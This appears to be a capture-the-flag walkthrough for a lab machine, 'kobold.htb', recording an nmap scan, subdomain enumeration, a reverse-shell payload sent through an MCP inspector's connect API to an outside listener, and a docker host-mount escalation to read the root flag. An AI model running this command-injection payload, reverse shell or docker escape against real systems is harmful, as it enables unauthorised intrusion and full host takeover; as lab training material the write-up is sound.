## NMAP SCAN 
```
nmap -A 10.129.245.50  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:04 +0700
Nmap scan report for kobold.htb (10.129.245.50)
Host is up (0.073s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_http-title: Kobold Operations Suite
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   72.18 ms 10.10.14.1
2   72.55 ms kobold.htb (10.129.245.50)
```

lets to sub domain enum 
```
gobuster vhost --quiet -k -u https://kobold.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain

mcp.kobold.htb Status: 200 [Size: 466]
#www.kobold.htb Status: 400 [Size: 166]
bin.kobold.htb Status: 200 [Size: 24402]
#mail.kobold.htb Status: 400 [Size: 166]
```

-k for https
lets look for vulnerability...
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST https://mcp.kobold.htb/api/mcp/connect -k -H "Content-Type: application/json" -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.53/4444 0>&1"],"env":{}},"serverId":"pwn"}' 

{"success":false,"error":"Connection failed for server pwn: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}
```
got a shell !!!! 
```
nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.245.50] 35758
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ whoami
whoami
ben
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cd /home
cd /home
ben@kobold:/home$ ls
ls
alice
ben
ben@kobold:/home$ cd ben
cd ben
ben@kobold:~$ ls
ls
user.txt
ben@kobold:~$ cat user
cat user.txt 
2c0ad09401727e2cbf17360da9707c46
```

got user flag
```
ben@kobold:/home$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
ben@kobold:/home$ cd ..
cd ..
ben@kobold:/$ ls
ls
app
bin
boot
cdrom
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
privatebin-data
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
ben@kobold:/$ newgrp docker
newgrp docker
docker images
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   2 months ago   922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
docker run -v /:/hostfs --rm --entrypoint sh mysql -c "cat /hostfs/root/root.txt"
639e668e3b4f73829dbc27d7a4f6ce7f

```

mounted a docker and opened root flag through that 